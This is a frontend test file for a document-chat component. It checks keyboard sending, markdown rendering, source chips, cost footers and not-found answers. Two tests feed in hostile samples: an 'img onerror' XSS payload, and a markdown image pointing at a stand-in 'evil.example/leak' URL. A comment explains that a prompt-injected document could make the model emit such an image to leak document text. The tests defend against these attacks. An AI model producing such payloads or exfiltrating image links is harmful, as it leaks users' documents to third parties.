import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { ChatView } from "@/components/chat/ChatView";
import { TooltipProvider } from "@/components/ui/tooltip";
import { api } from "@/lib/api";
import type { QueryResponse } from "@/lib/types";

function setup(answerText = "Jane is a **data engineer**.", extra: Partial<QueryResponse> = {}) {
  const query = vi.spyOn(api, "query").mockResolvedValue({
    trace_id: "t1",
    question: "q",
    answer: answerText,
    sources: [{ file_name: "cv.pdf", page_number: 1 }],
    ...extra,
  });
  render(
    <TooltipProvider>
      <ChatView documentId="docA" fileName="cv.pdf" />
    </TooltipProvider>
  );
  return { query, input: screen.getByRole("textbox", { name: "Ask about this document" }) };
}

afterEach(() => vi.restoreAllMocks());

test("Enter sends, Shift+Enter adds a newline, empty input cannot send", async () => {
  const { query, input } = setup();
  expect(screen.getByRole("button", { name: "Send" })).toBeDisabled();

  await userEvent.type(input, "line one{Shift>}{Enter}{/Shift}line two");
  expect(input).toHaveValue("line one\nline two");
  expect(query).not.toHaveBeenCalled();

  await userEvent.keyboard("{Enter}");
  expect(query).toHaveBeenCalledWith("docA", "line one\nline two");
  expect(input).toHaveValue("");
});

test("two quick Enter presses send one request", async () => {
  const { query, input } = setup();
  await userEvent.type(input, "Who is Jane?{Enter}{Enter}");
  expect(query).toHaveBeenCalledTimes(1);
});

test("HTML in an answer is shown as text, markdown still renders", async () => {
  const { input } = setup("<img src=x onerror=alert(1)> and **bold**");
  await userEvent.type(input, "q{Enter}");
  const strong = await screen.findByText("bold");
  expect(strong.tagName).toBe("STRONG");
  expect(document.querySelector("img")).toBeNull();
});

test("markdown images are not loaded and links open safely in a new tab", async () => {
  // A prompt-injected document could make the model emit an image URL that
  // sends document text to a third party with no click needed
  const { input } = setup("![x](https://evil.example/leak?d=secret) see [docs](https://example.com)");
  await userEvent.type(input, "q{Enter}");
  const link = await screen.findByRole("link", { name: "docs" });
  expect(document.querySelector("img")).toBeNull();
  expect(document.querySelector('link[rel="preload"]')).toBeNull();
  expect(link).toHaveAttribute("target", "_blank");
  expect(link).toHaveAttribute("rel", "noopener noreferrer");
});

test("starter questions send their exact text", async () => {
  const { query } = setup();
  expect(screen.getByRole("heading", { name: "Ask anything about cv.pdf" })).toBeInTheDocument();
  await userEvent.click(screen.getByRole("button", { name: "Who is this about?" }));
  expect(query).toHaveBeenCalledWith("docA", "Who is this about?");
});

test("answers appear in a polite live region with source chips", async () => {
  const { input } = setup();
  await userEvent.type(input, "q{Enter}");
  const log = screen.getByRole("log");
  expect(log).toHaveAttribute("aria-live", "polite");
  expect(await within(log).findByText("data engineer")).toBeInTheDocument();
  expect(within(log).getByText("p.1")).toBeInTheDocument();
});

test("Copy puts the answer on the clipboard", async () => {
  const { input } = setup("Plain answer.");
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
  await userEvent.type(input, "q{Enter}");
  await userEvent.click(await screen.findByRole("button", { name: "Copy answer" }));
  expect(writeText).toHaveBeenCalledWith("Plain answer.");
});

describe("answer transparency", () => {
  const usage = { total_tokens: 1900, cost_usd: 0.0004, jev_cost_included: true };

  async function answer(extra: Partial<QueryResponse>, text = "Jane is a data engineer.") {
    const { input } = setup(text, extra);
    await userEvent.type(input, "q{Enter}");
    return screen.findByRole("article");
  }

  test("footer shows tokens and cost", async () => {
    const article = await answer({ usage });
    expect(within(article).getByText(/1\.9k tokens/)).toBeInTheDocument();
    expect(within(article).getByText(/\$0\.0004/)).toBeInTheDocument();
  });

  test("cost says excl. Jev when Jev usage was not reported", async () => {
    const article = await answer({ usage: { ...usage, jev_cost_included: false } });
    expect(within(article).getByText(/excl\. Jev/)).toBeInTheDocument();
  });

  test("cached and fallback badges", async () => {
    const article = await answer({ cached: true, usage: { total_tokens: 0, cost_usd: 0, jev_cost_included: true }, fallbacks: ["rerank"] });
    expect(within(article).getByText("cached")).toBeInTheDocument();
    expect(within(article).getByText("Jev fallback: rerank")).toBeInTheDocument();
  });

  test("no footer details when the response has none (older backend)", async () => {
    const article = await answer({});
    expect(within(article).queryByText(/tokens/)).not.toBeInTheDocument();
    expect(within(article).queryByText("cached")).not.toBeInTheDocument();
  });

  test("a not-found answer lists its closest passages", async () => {
    const article = await answer(
      {
        answer_status: "not_found",
        near_misses: [
          { file_name: "cv.pdf", page_number: 1, jev: 0.08, reason: "below_min_relevance", preview: "Yogesh Chopade AI / GenAI Engineer" },
          { file_name: "cv.pdf", page_number: 2, jev: 0.05, reason: "below_min_relevance", preview: "Skills: Python" },
        ],
      },
      "I could not find the answer in the document."
    );
    const list = within(article).getByRole("list", { name: "Closest passages" });
    expect(within(list).getAllByRole("listitem")).toHaveLength(2);
    expect(within(list).getByText("0.08")).toBeInTheDocument();
    expect(within(list).getByText(/Yogesh Chopade AI/)).toBeInTheDocument();
    expect(within(article).getByText(/none were judged relevant enough to use/)).toBeInTheDocument();
  });

  test("answered messages show no near-miss block", async () => {
    const article = await answer({ answer_status: "answered", near_misses: [] });
    expect(within(article).queryByRole("list", { name: "Closest passages" })).not.toBeInTheDocument();
  });
});

test("the empty state offers to test the document", async () => {
  const onTest = vi.fn();
  render(
    <TooltipProvider>
      <ChatView documentId="docA" fileName="cv.pdf" onTestDocument={onTest} />
    </TooltipProvider>
  );
  await userEvent.click(screen.getByRole("button", { name: "Test this document" }));
  expect(onTest).toHaveBeenCalled();
});
